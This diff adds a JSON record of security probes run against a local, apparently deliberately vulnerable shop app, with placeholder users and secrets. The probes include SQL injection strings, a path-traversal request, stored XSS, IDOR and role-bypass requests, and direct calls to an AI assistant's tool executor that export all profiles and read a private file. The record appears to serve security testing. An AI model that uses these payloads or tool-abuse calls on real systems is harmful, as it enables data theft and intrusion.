@@ -1,0 +1,250 @@
+{
+  "transport": "real HTTP, 127.0.0.1, ephemeral port",
+  "probes": [
+    {
+      "name": "unauthenticated-profile",
+      "method": "GET",
+      "path": "/profile?id=2",
+      "body": null,
+      "identity": "anonymous",
+      "status": 200,
+      "response": [
+        {
+          "id": 2,
+          "name": "TEST_BOB",
+          "email": "bob@example.invalid",
+          "address": "TEST_ADDRESS_B"
+        }
+      ]
+    },
+    {
+      "name": "profile-idor",
+      "method": "GET",
+      "path": "/profile?id=2",
+      "body": null,
+      "identity": "alice",
+      "status": 200,
+      "response": [
+        {
+          "id": 2,
+          "name": "TEST_BOB",
+          "email": "bob@example.invalid",
+          "address": "TEST_ADDRESS_B"
+        }
+      ]
+    },
+    {
+      "name": "profile-sqli",
+      "method": "GET",
+      "path": "/profile?id=1%20OR%201%3D1",
+      "body": null,
+      "identity": "alice",
+      "status": 200,
+      "response": [
+        {
+          "id": 1,
+          "name": "TEST_ALICE",
+          "email": "alice@example.invalid",
+          "address": "TEST_ADDRESS_A"
+        },
+        {
+          "id": 2,
+          "name": "TEST_BOB",
+          "email": "bob@example.invalid",
+          "address": "TEST_ADDRESS_B"
+        }
+      ]
+    },
+    {
+      "name": "search-sqli",
+      "method": "GET",
+      "path": "/search?q=%27%20OR%201%3D1%20--",
+      "body": null,
+      "identity": "alice",
+      "status": 200,
+      "response": [
+        {
+          "id": 1,
+          "name": "TEST_ALICE",
+          "email": "alice@example.invalid",
+          "address": "TEST_ADDRESS_A"
+        },
+        {
+          "id": 2,
+          "name": "TEST_BOB",
+          "email": "bob@example.invalid",
+          "address": "TEST_ADDRESS_B"
+        }
+      ]
+    },
+    {
+      "name": "orders-idor",
+      "method": "GET",
+      "path": "/orders",
+      "body": null,
+      "identity": "alice",
+      "status": 200,
+      "response": [
+        {
+          "id": 1,
+          "owner": 1,
+          "product": "chair",
+          "price": 5000.0
+        },
+        {
+          "id": 2,
+          "owner": 2,
+          "product": "lamp",
+          "price": 1500.0
+        }
+      ]
+    },
+    {
+      "name": "price-tampering",
+      "method": "POST",
+      "path": "/orders",
+      "body": {
+        "product": "chair",
+        "price": -1
+      },
+      "identity": "alice",
+      "status": 201,
+      "response": {
+        "id": 3,
+        "owner": 1,
+        "product": "chair",
+        "price": -1
+      }
+    },
+    {
+      "name": "role-spoofing",
+      "method": "GET",
+      "path": "/admin/export",
+      "body": null,
+      "identity": "alice",
+      "status": 200,
+      "response": [
+        {
+          "id": 1,
+          "name": "TEST_ALICE",
+          "email": "alice@example.invalid",
+          "address": "TEST_ADDRESS_A"
+        },
+        {
+          "id": 2,
+          "name": "TEST_BOB",
+          "email": "bob@example.invalid",
+          "address": "TEST_ADDRESS_B"
+        }
+      ]
+    },
+    {
+      "name": "file-idor",
+      "method": "GET",
+      "path": "/files?user=bob",
+      "body": null,
+      "identity": "alice",
+      "status": 200,
+      "response": {
+        "content": "TEST_BOB receipt: lamp, 1500 RUB"
+      }
+    },
+    {
+      "name": "file-traversal",
+      "method": "GET",
+      "path": "/files?user=../private&path=operator-note.txt",
+      "body": null,
+      "identity": "alice",
+      "status": 200,
+      "response": {
+        "content": "TEST_ONLY_OPERATOR_SECRET"
+      }
+    },
+    {
+      "name": "log-disclosure",
+      "method": "GET",
+      "path": "/debug/logs",
+      "body": null,
+      "identity": "alice",
+      "status": 200,
+      "response": {
+        "entries": 13,
+        "contains_password": true,
+        "contains_session_token": true
+      }
+    },
+    {
+      "name": "context-idor",
+      "method": "GET",
+      "path": "/assistant/context?order_id=2",
+      "body": null,
+      "identity": "alice",
+      "status": 200,
+      "response": {
+        "prompt": "Ты помощник магазина. Прочитай заказ и отзывы. Верни JSON с полями tool и arguments.\nИнструменты: read_file(path), export_profiles(), delete_tree(path).\nПомоги пользователю обработать заказ.\nЗаказ: [{\"id\": 2, \"owner\": 2, \"product\": \"lamp\", \"price\": 1500.0}]\nОтзывы: []\nЗапрос пользователя: Покажи чек по заказу"
+      }
+    },
+    {
+      "name": "context-sqli",
+      "method": "GET",
+      "path": "/assistant/context?order_id=1%20OR%201%3D1",
+      "body": null,
+      "identity": "alice",
+      "status": 200,
+      "response": {
+        "prompt": "Ты помощник магазина. Прочитай заказ и отзывы. Верни JSON с полями tool и arguments.\nИнструменты: read_file(path), export_profiles(), delete_tree(path).\nПомоги пользователю обработать заказ.\nЗаказ: [{\"id\": 1, \"owner\": 1, \"product\": \"chair\", \"price\": 5000.0}, {\"id\": 2, \"owner\": 2, \"product\": \"lamp\", \"price\": 1500.0}, {\"id\": 3, \"owner\": 1, \"product\": \"chair\", \"price\": -1.0}]\nОтзывы: []\nЗапрос пользователя: Покажи чек по заказу"
+      }
+    },
+    {
+      "name": "executor-export",
+      "method": "POST",
+      "path": "/assistant/execute",
+      "body": {
+        "decision": {
+          "tool": "export_profiles",
+          "arguments": {}
+        }
+      },
+      "identity": "alice",
+      "status": 200,
+      "response": [
+        {
+          "id": 1,
+          "name": "TEST_ALICE",
+          "email": "alice@example.invalid",
+          "address": "TEST_ADDRESS_A"
+        },
+        {
+          "id": 2,
+          "name": "TEST_BOB",
+          "email": "bob@example.invalid",
+          "address": "TEST_ADDRESS_B"
+        }
+      ]
+    },
+    {
+      "name": "executor-read-private",
+      "method": "POST",
+      "path": "/assistant/execute",
+      "body": {
+        "decision": {
+          "tool": "read_file",
+          "arguments": {
+            "path": "private/operator-note.txt"
+          }
+        }
+      },
+      "identity": "alice",
+      "status": 200,
+      "response": {
+        "content": "TEST_ONLY_OPERATOR_SECRET"
+      }
+    },
+    {
+      "name": "stored-xss",
+      "status": 200,
+      "response": "<html><body><p><script>alert(1)</script></p></body></html>",
+      "script_element_present": true
+    }
+  ]
+}
